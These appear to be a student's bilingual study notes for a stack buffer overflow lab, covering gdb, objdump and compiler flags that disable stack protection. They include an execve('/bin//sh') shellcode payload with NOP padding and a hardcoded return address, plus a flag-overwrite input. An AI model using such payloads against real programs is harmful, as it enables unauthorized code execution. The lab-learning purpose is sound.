


env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 <param>

env -i PWD="/home/seed/labs/lab3/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/523/labs/lab3/stack_addresses/ans_check5 <param>
unset env LINES
unset env COLUMNS
break 
run $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*24 + '\x6c\xfd\xff\xbf'")


* A sheet for later use


gcc option
-fno-stack-protector : disables stack protection
-g : default debug information
-o : set output file name
-z execstack : marks the stack as executable


objdump
objdump -D ans_check5 | grep -B 1 exit

./ans_check5 $(python -c "print ‘\xAA’*N + ‘\xef\xbe\xad\xde’")

gdb command
list <line number> : Show the code
break <line nuber> :
run <param> : keep executing
c : after breaking, keep executing
dissass <function name> : Shows the disassembled code and it's memory address
 
ex)
 
 x/s ans_buf
 x/xw &ans_flag
 x/32xw &esp

 x/s <address> or <address of variable> : Shows the string of the pointing address
x/xw <address> or <address of variable> : Shows the content of the address
해당 주소 내용을 문자로 보고 싶다.
16진수로 보고 싶다. 

 x 명령 
 옵션 
 x 는 16진수
 w 는 4 byte 씩 보여주고
 x/32xw 에서 32는 
 해당 주소부터 32개를 더 보여 달라는 의미


 

# grep -B 1 exit
-B 1 : exit 찾고 그것만 보여주지 말고 그 전에 한줄도 보여주란 옵션

# grep -A 1 exit
-A 1 : exit 찾고 그것만 보여주지 말고 그 에 한줄도 보여주란 옵션


# gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
-z execstack : make stack executable



# gdb 옵션
-q : 시작시 설명문구 없이 시작

# break <line number> or <function name>
break : 중단점 걸기

# i b
break information 보기

# i r esp
i r : information register
  i r esp : esp 정보 보여줘

# x/32xw $esp
x : 메모리 조사하는 옵션  
o : 8진법으로 보여줌
x : 16진법으로 보여줌
u : 10진법으로 보여줌
t : 2진법으로 보여줌

b : 1 byte 단위로 보여줌(byte)
h : 2 byte 단위로 보여줌(half word)
w: 4 byte 단위로 보여줌(word) - 난 2byte로 알고 있지만 여기선 4바이트로 쓰이나 보다....
g : 8 byte 단위로 보여줌(giant)

i : 역어셈블된 명령어의 명령 메모리를 볼수 있음
c : ASCII 표의 바이트를 자동으로 볼 수 있다.
s : 문자 데이터의 전체 문자열을 보여준다.

 
 
  
# gdb 
(gdb) set args “--help”
(gdb) break __libc_start_main
(gdb) run
(gdb) frame
(gdb) bt
(gdb) info frame
(gdb) info registers
(gdb) x /16xw $esp

gdb date
(gdb) set args “--version”
(gdb) break __libc_start_main
(gdb) run
(gdb) maintenance info sections
note the start address of the .rodata section
(gdb) x/20s {.rodata address}
note the start address of the string “GNU coreutils” as {start}
(gdb) set *{start} = 0x20554c42
(gdb) c
